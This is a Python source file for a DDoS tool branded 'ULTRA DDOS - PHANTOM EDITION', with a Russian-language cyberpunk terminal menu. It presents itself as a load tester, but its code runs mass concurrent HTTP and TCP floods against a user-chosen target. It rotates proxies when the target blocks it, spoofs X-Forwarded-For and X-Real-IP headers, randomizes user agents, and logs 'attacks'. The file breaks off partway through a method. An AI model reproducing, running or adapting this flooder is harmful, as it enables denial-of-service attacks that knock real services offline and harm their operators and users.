#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════╗
║   U L T R A   D D O S   -   P H A N T O M   E D I T I O N ║
║        Cyberpunk Terminal Interface                       ║
║              [ErrorCode404] ver 5.0                        ║
╚═══════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import json
import asyncio
import aiohttp
import socket
import logging
from datetime import datetime

# ================= CONSOLE SETUP =================
os.system('mode con: cols=120 lines=40')
os.system('color 0F')

# ================= LOGGER =================
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, "ultra.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= COLORS =================
class C:
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    YELLOW = '\033[93m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    
    @staticmethod
    def rgb(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"
    
    # Зелёные оттенки (как на скриншоте)
    GREEN_DARK = rgb(0, 80, 0)
    GREEN_MID = rgb(0, 140, 0)
    GREEN_LIGHT = rgb(0, 200, 0)
    GREEN_LIGHT2 = rgb(50, 255, 50)
    GREEN_MID2 = rgb(0, 180, 0)
    GREEN_DARK2 = rgb(0, 100, 0)
    
    NEON_GREEN = rgb(0, 255, 100)

# ================= БАННЕР (ЗЕЛЁНЫЙ ГРАДИЕНТ) =================
def banner():
    print(f"""
{C.GREEN_DARK} ██    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄         ▓█████▄ ▓█████▄  ▒█████    ██████ {C.RESET}
{C.GREEN_MID}  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ {C.RESET}
{C.GREEN_LIGHT}  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   {C.RESET}
{C.GREEN_LIGHT2}  ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒{C.RESET}
{C.GREEN_MID2}  ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒{C.RESET}
{C.GREEN_DARK2}  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░{C.RESET}
{C.GREEN_DARK}  ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░{C.RESET}
{C.GREEN_MID}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {C.RESET}
{C.GREEN_LIGHT}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {C.RESET}
{C.GREEN_LIGHT2}                                               ░       ░                           {C.RESET}
""")

# ================= КОНФИГ =================
CONFIG = {
    "max_threads": 1000,
    "timeout": 3,
    "max_duration": 0,
    "proxy_rotation_interval": 10
}

# ================= СТАТИСТИКА =================
def load_stats():
    try:
        with open('stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}

def save_stats(s):
    try:
        with open('stats.json', 'w') as f:
            json.dump(s, f, indent=4)
    except:
        pass

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            h = json.load(f)
    except:
        h = []
    h.append(entry)
    if len(h) > 100:
        h = h[-100:]
    try:
        with open('history.json', 'w') as f:
            json.dump(h, f, indent=4)
    except:
        pass

def load_history():
    try:
        with open('history.json', 'r') as f:
            return json.load(f)
    except:
        return []

# ================= PROXY =================
async def check_proxy(p):
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            async with s.get('http://httpbin.org/ip', proxy=p) as r:
                return r.status == 200
    except:
        return False

# ================= TCP =================
async def tcp_flood(ip, port):
    try:
        r, w = await asyncio.open_connection(ip, port)
        for _ in range(5):
            w.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            await w.drain()
        w.close()
        await w.wait_closed()
        return True
    except:
        return False

# ================= SAFE INPUT =================
def safe_int(prompt, default=100, min_val=1, max_val=1000):
    while True:
        u = input(prompt)
        if u == "":
            return default
        try:
            v = int(u)
            if min_val <= v <= max_val:
                return v
            print(f"{C.RED}[!] От {min_val} до {max_val}{C.RESET}")
        except:
            print(f"{C.RED}[!] Введи число{C.RESET}")

# ================= LOAD TESTER =================
class LoadTester:
    def __init__(self):
        self.running = False
        self.requests = 0
        self.success = 0
        self.errors = 0
        self.banned = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.session = None
        self.proxies = []
        self.idx = 0
        self.lock = asyncio.Lock()

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                self.proxies = [l.strip() for l in f if l.strip()]
            return len(self.proxies)
        except:
            return 0

    def next_proxy(self):
        if not self.proxies:
            return None
        p = self.proxies[self.idx]
        self.idx = (self.idx + 1) % len(self.proxies)
        return p

    async def http_test(self, url):
        try:
            if self.session is None or self.session.closed:
                connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=60)
                timeout = aiohttp.ClientTimeout(total=CONFIG["timeout"])
                self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

            proxy = self.next_proxy() if self.proxies else None

            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0',
                ]),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if self.banned > 0 and self.banned % CONFIG["proxy_rotation_interval"] == 0:
                self.idx = random.randint(0, len(self.proxies) - 1) if self.proxies else 0
                await asyncio.sleep(0.5)

            async with self.session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                body = await resp.read()
                async with self.lock:
                    self.requests += 1
                    self.bytes_sent += len(body)
                    if resp.status in [200, 301, 302, 404]:
                        self.success += 1
                    elif resp.status in [403, 429, 503]:
                        self.banned += 1
                        self.errors += 1
                    else:
                        self.errors += 1
        except:
            async with self.lock:
                self.requests += 1
                self.errors += 1

    async def start_http(self, url, threads):
        self.running = True
        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
        self.start_time = time.time()
        self.load_proxies()

        sem = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with sem:
                    await self.http_test(url)
                    await asyncio.sleep(random.uniform(0.0005, 0.005))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    async def start_tcp(self, target, threads):
        try:
            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            port = 443 if target.startswith('https://') else 80
        except:
            return

        self.running = True
        self.requests = self.success = self.errors = self.banned = 0
        self.start_time = time.time()
        self.load_proxies()

        sem = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with sem:
                    if await tcp_flood(ip, port):
                        async with self.lock:
                            self.requests += 1
                            self.success += 1
                    else:
                        async with self.lock:
                            self.requests += 1
                            self.errors += 1
                    await asyncio.sleep(random.uniform(0.001, 0.01))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        self.running = False
        if self.session:
            asyncio.create_task(self.session.close())

# ================= UI =================
class UI:
    def __init__(self):
        self.width = 120
        self.running = True
        self.menu = 'main'
        self.matrix = list('アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789')
        self.tester = LoadTester()

    def clear(self):
        os.system('cls')

    def matrix_rain(self, lines=2):
        for _ in range(lines):
            row = ''.join(random.choices(self.matrix, k=self.width))
            print(f"{C.NEON_GREEN}{row}{C.RESET}")

    def header(self):
        banner()
        print(f"""
{C.GREEN_LIGHT2}╔{'═' * 116}╗{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET} {C.DIM}[ErrorCode404] {datetime.now().strftime('%H:%M:%S')} | Status: {C.GREEN_LIGHT}● ONLINE{C.RESET}{' ' * 85}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_MID}╠{'═' * 116}╣{C.RESET}
""")

    def footer(self):
        print(f"""
{C.GREEN_MID}╠{'═' * 116}╣{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET} {C.DIM}v5.0 | by @jecrs | verificator | Neural Link: ACTIVE | Firewall: ENABLED{C.RESET}{' ' * 33}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_DARK}╚{'═' * 116}╝{C.RESET}
""")

    def main_menu(self):
        self.clear()
        self.matrix_rain(2)
        self.header()
        print(f"""
{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[MAIN MENU]{C.RESET}{' ' * 106}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_LIGHT2}➤ [1]{C.RESET} HTTP Load Test            {C.DIM}| HTTP/HTTPS нагрузка{C.RESET}{' ' * 55}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_MID}➤ [2]{C.RESET} TCP Load Test             {C.DIM}| TCP нагрузка{C.RESET}{' ' * 68}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_DARK2}➤ [3]{C.RESET} View Logs                 {C.DIM}| Логи тестов{C.RESET}{' ' * 70}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_MID2}➤ [4]{C.RESET} Proxy Management          {C.DIM}| Управление прокси{C.RESET}{' ' * 58}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_LIGHT}➤ [5]{C.RESET} Total Statistics           {C.DIM}| Общая статистика{C.RESET}{' ' * 59}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_LIGHT2}➤ [6]{C.RESET} History                  {C.DIM}| История тестов{C.RESET}{' ' * 68}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_DARK}➤ [7]{C.RESET} Settings                  {C.DIM}| Настройки{C.RESET}{' ' * 74}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_MID}➤ [8]{C.RESET} INFO                     {C.DIM}| Инструкция{C.RESET}{' ' * 71}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.RED}[X]{C.RESET} EXIT                      {C.DIM}| Выход{C.RESET}{' ' * 85}{C.GREEN_LIGHT}║{C.RESET}
""")
        self.footer()

    def info_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        print(f"""
{C.GREEN_LIGHT2}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT}[INSTRUCTIONS]{C.RESET}{' ' * 105}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.GREEN_LIGHT}■ HTTP Load Test{C.RESET}{' ' * 96}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}    └─ Запускает HTTP/HTTPS нагрузку на указанный URL/IP{C.RESET}{' ' * 54}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.GREEN_MID}■ TCP Load Test{C.RESET}{' ' * 98}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}    └─ Запускает TCP нагрузку на указанный URL{C.RESET}{' ' * 69}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.GREEN_DARK2}■ View Logs{C.RESET}{' ' * 102}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}    └─ Показывает общую статистику всех тестов{C.RESET}{' ' * 64}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.GREEN_MID2}■ Proxy Management{C.RESET}{' ' * 94}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}    └─ Добавление, удаление и проверка прокси{C.RESET}{' ' * 62}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.GREEN_LIGHT}■ Total Statistics{C.RESET}{' ' * 94}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}    └─ Суммарная статистика по всем тестам{C.RESET}{' ' * 66}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.GREEN_MID}■ History{C.RESET}{' ' * 104}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}    └─ Последние 100 проведённых тестов{C.RESET}{' ' * 67}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.GREEN_DARK}■ Settings{C.RESET}{' ' * 104}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}    └─ Настройка потоков, таймаута и ротации прокси{C.RESET}{' ' * 54}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.BOLD}[BACK]{C.RESET} Return to Main Menu{' ' * 89}{C.GREEN_LIGHT2}║{C.RESET}
""")
        self.footer()

    def settings_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        print(f"""
{C.GREEN_MID}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[SETTINGS]{C.RESET}{' ' * 107}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}{' ' * 116}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_LIGHT}■ Max Threads :{C.RESET} {C.WHITE}{CONFIG['max_threads']}{C.RESET}{' ' * 98}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_MID2}■ Timeout     :{C.RESET} {C.WHITE}{CONFIG['timeout']}s{C.RESET}{' ' * 103}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_DARK2}■ Max Duration:{C.RESET} {C.WHITE}{CONFIG['max_duration']}s{C.RESET}{' ' * 97}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_DARK}■ Proxy Rot.  :{C.RESET} {C.WHITE}{CONFIG['proxy_rotation_interval']}{C.RESET}{' ' * 90}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}{' ' * 116}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_LIGHT}[1]{C.RESET} Edit Max Threads{' ' * 83}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_MID2}[2]{C.RESET} Edit Timeout{' ' * 89}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_DARK2}[3]{C.RESET} Edit Max Duration{' ' * 82}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.GREEN_DARK}[4]{C.RESET} Edit Proxy Rotation{' ' * 78}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}{' ' * 116}{C.GREEN_MID}║{C.RESET}
{C.GREEN_MID}║{C.RESET}  {C.BOLD}[BACK]{C.RESET} Return to Main Menu{' ' * 89}{C.GREEN_MID}║{C.RESET}
""")
        self.footer()

    def history_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        h = load_history()
        print(f"""
{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[HISTORY - LAST 10]{C.RESET}{' ' * 96}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT}║{C.RESET}
""")
        if not h:
            print(f"{C.GREEN_LIGHT}║{C.RESET}  {C.DIM}No records found{' ' * 97}{C.GREEN_LIGHT}║{C.RESET}")
        else:
            for i, e in enumerate(h[-10:], 1):
                t = e.get('target', 'N/A')[:25]
                r = e.get('requests', 0)
                ts = e.get('timestamp', '')[:16]
                print(f"{C.GREEN_LIGHT}║{C.RESET}  {C.GREEN_LIGHT2}{i}.{C.RESET} {C.WHITE}{t:<25}{C.RESET} {C.GREEN_MID}{r} req{C.RESET} {C.DIM}{ts}{C.RESET}{' ' * (116 - 4 - 25 - len(str(r)) - len(ts) - 10)}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"""
{C.GREEN_LIGHT}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}[BACK]{C.RESET} Return to Main Menu{' ' * 89}{C.GREEN_LIGHT}║{C.RESET}
""")
        self.footer()

    def stats_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        s = load_stats()
        print(f"""
{C.GREEN_LIGHT2}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT}[TOTAL STATISTICS]{C.RESET}{' ' * 98}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  Attacks : {C.WHITE}{s['attacks']}{C.RESET}{' ' * 98}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  Requests: {C.WHITE}{s['requests']:,}{C.RESET}{' ' * 89}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  Success : {C.WHITE}{s['success']:,}{C.RESET}{' ' * 90}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  Errors  : {C.WHITE}{s['errors']:,}{C.RESET}{' ' * 90}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT2}║{C.RESET}
{C.GREEN_LIGHT2}║{C.RESET}  {C.BOLD}[BACK]{C.RESET} Return to Main Menu{' ' * 89}{C.GREEN_LIGHT2}║{C.RESET}
""")
        self.footer()

    def logs_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        s = load_stats()
        print(f"""
{C.GREEN_DARK2}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[SYSTEM LOGS]{C.RESET}{' ' * 103}{C.GREEN_DARK2}║{C.RESET}
{C.GREEN_DARK2}║{C.RESET}{' ' * 116}{C.GREEN_DARK2}║{C.RESET}
{C.GREEN_DARK2}║{C.RESET}  Total Attacks: {C.WHITE}{s['attacks']}{C.RESET}{' ' * 98}{C.GREEN_DARK2}║{C.RESET}
{C.GREEN_DARK2}║{C.RESET}  Total Requests: {C.WHITE}{s['requests']:,}{C.RESET}{' ' * 89}{C.GREEN_DARK2}║{C.RESET}
{C.GREEN_DARK2}║{C.RESET}  Total Success : {C.WHITE}{s['success']:,}{C.RESET}{' ' * 89}{C.GREEN_DARK2}║{C.RESET}
{C.GREEN_DARK2}║{C.RESET}  Total Errors  : {C.WHITE}{s['errors']:,}{C.RESET}{' ' * 89}{C.GREEN_DARK2}║{C.RESET}
{C.GREEN_DARK2}║{C.RESET}{' ' * 116}{C.GREEN_DARK2}║{C.RESET}
{C.GREEN_DARK2}║{C.RESET}  {C.BOLD}[BACK]{C.RESET} Return to Main Menu{' ' * 89}{C.GREEN_DARK2}║{C.RESET}
""")
        self.footer()

    def proxy_menu(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        try:
            with open('proxies.txt', 'r') as f:
                proxies = [l.strip() for l in f if l.strip()]
        except:
            proxies = []
        print(f"""
{C.GREEN_MID2}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[PROXY MANAGEMENT]{C.RESET}{' ' * 96}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}{' ' * 116}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}  {C.GREEN_LIGHT}[1]{C.RESET} Add proxy manually{' ' * 82}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}  {C.GREEN_MID2}[2]{C.RESET} Load from file{' ' * 84}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}  {C.GREEN_DARK2}[3]{C.RESET} Show list ({len(proxies)}){' ' * 76}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}  {C.GREEN_DARK}[4]{C.RESET} Clear list{' ' * 89}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}  {C.GREEN_LIGHT2}[5]{C.RESET} Check all{' ' * 86}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}{' ' * 116}{C.GREEN_MID2}║{C.RESET}
{C.GREEN_MID2}║{C.RESET}  {C.BOLD}[BACK]{C.RESET} Return to Main Menu{' ' * 89}{C.GREEN_MID2}║{C.RESET}
""")
        self.footer()

    def attack_progress(self, url, threads, t):
        elapsed = int(time.time() - t.start_time)
        rate = int(t.requests / elapsed) if elapsed > 0 else 0
        load = min(100, int(rate / 15))
        bar = '█' * (load // 2) + '░' * (50 - load // 2)
        
        self.clear()
        self.matrix_rain(1)
        self.header()
        print(f"""
{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[ATTACK IN PROGRESS]{C.RESET}{' ' * 93}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  Target : {C.WHITE}{url[:30]}{C.RESET}{' ' * 84}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  Threads: {C.WHITE}{threads}{C.RESET}{' ' * 88}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  Req    : {C.WHITE}{t.requests:,}{C.RESET}{' ' * 90}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  Rate   : {C.WHITE}{rate:,} r/s{C.RESET}{' ' * 84}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  OK     : {C.WHITE}{t.success:,}{C.RESET}{' ' * 91}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  ERR    : {C.WHITE}{t.errors:,}{C.RESET}{' ' * 91}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  BAN    : {C.WHITE}{t.banned}{C.RESET}{' ' * 91}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  Load   : {C.WHITE}[{bar}] {load}%{C.RESET}{' ' * 90}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  Time   : {C.WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}{C.RESET}{' ' * 84}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  Data   : {C.WHITE}{t.bytes_sent/1024/1024:.1f} MB{C.RESET}{' ' * 85}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}{' ' * 116}{C.GREEN_LIGHT}║{C.RESET}
{C.GREEN_LIGHT}║{C.RESET}  {C.YELLOW}[Press ENTER to stop]{C.RESET}{' ' * 87}{C.GREEN_LIGHT}║{C.RESET}
""")
        self.footer()

    def handle(self, choice):
        if self.menu == 'main':
            if choice == '1':
                asyncio.run(self.http_test())
            elif choice == '2':
                asyncio.run(self.tcp_test())
            elif choice == '3':
                self.menu = 'logs'
            elif choice == '4':
                self.menu = 'proxy'
            elif choice == '5':
                self.menu = 'stats'
            elif choice == '6':
                self.menu = 'history'
            elif choice == '7':
                self.menu = 'settings'
            elif choice == '8':
                self.menu = 'info'
            elif choice.upper() == 'X':
                self.running = False
        elif choice.lower() == 'back':
            self.menu = 'main'
        elif self.menu == 'settings':
            if choice == '1':
                v = safe_int(f"{C.CYAN}Max Threads (100-2000): {C.WHITE}", 1000, 100, 2000)
                CONFIG['max_threads'] = v
            elif choice == '2':
                while True:
                    v = input(f"{C.CYAN}Timeout (0.5-10): {C.WHITE}")
                    try:
                        v = float(v)
                        if 0.5 <= v <= 10:
                            CONFIG['timeout'] = v
                            break
                    except:
                        print(f"{C.RED}[!] Введи число{C.RESET}")
            elif choice == '3':
                v = safe_int(f"{C.CYAN}Max Duration (0 = no limit): {C.WHITE}", 0, 0, 99999)
                CONFIG['max_duration'] = v
            elif choice == '4':
                v = safe_int(f"{C.CYAN}Proxy Rotation (5-100): {C.WHITE}", 10, 5, 100)
                CONFIG['proxy_rotation_interval'] = v
        elif self.menu == 'proxy':
            try:
                with open('proxies.txt', 'r') as f:
                    proxies = [l.strip() for l in f if l.strip()]
            except:
                proxies = []
            if choice == '1':
                p = input(f"{C.CYAN}Proxy (http://ip:port): {C.WHITE}")
                if p:
                    with open('proxies.txt', 'a') as f:
                        f.write(p + '\n')
                    print(f"{C.GREEN_LIGHT2}[OK] Добавлен{C.RESET}")
            elif choice == '2':
                try:
                    with open('proxies.txt', 'r') as f:
                        cnt = len([l for l in f if l.strip()])
                    print(f"{C.GREEN_LIGHT2}[OK] Загружено {cnt}{C.RESET}")
                except:
                    print(f"{C.RED}[!] Файл не найден{C.RESET}")
            elif choice == '3':
                if proxies:
                    print(f"\n{C.GREEN_LIGHT2}List:{C.RESET}")
                    for i, p in enumerate(proxies, 1):
                        print(f"{C.GREEN_LIGHT2}{i}. {C.WHITE}{p}{C.RESET}")
                else:
                    print(f"{C.YELLOW}[!] Пусто{C.RESET}")
                input(f"{C.CYAN}Press ENTER...{C.RESET}")
            elif choice == '4':
                open('proxies.txt', 'w').close()
                print(f"{C.GREEN_LIGHT2}[OK] Очищено{C.RESET}")
            elif choice == '5':
                print(f"{C.YELLOW}[!] Проверка...{C.RESET}")
                async def check():
                    valid = []
                    for p in proxies:
                        if await check_proxy(p):
                            valid.append(p)
                    return valid
                if proxies:
                    valid = asyncio.run(check())
                    with open('proxies.txt', 'w') as f:
                        f.write('\n'.join(valid))
                    print(f"{C.GREEN_LIGHT2}[OK] Работает: {len(valid)}/{len(proxies)}{C.RESET}")
                time.sleep(1)

    async def http_test(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        print(f"{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[HTTP LOAD TEST]{C.RESET}{' ' * 96}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Type: HTTP/HTTPS Flood{' ' * 79}{C.GREEN_LIGHT}║{C.RESET}")
        self.footer()
        
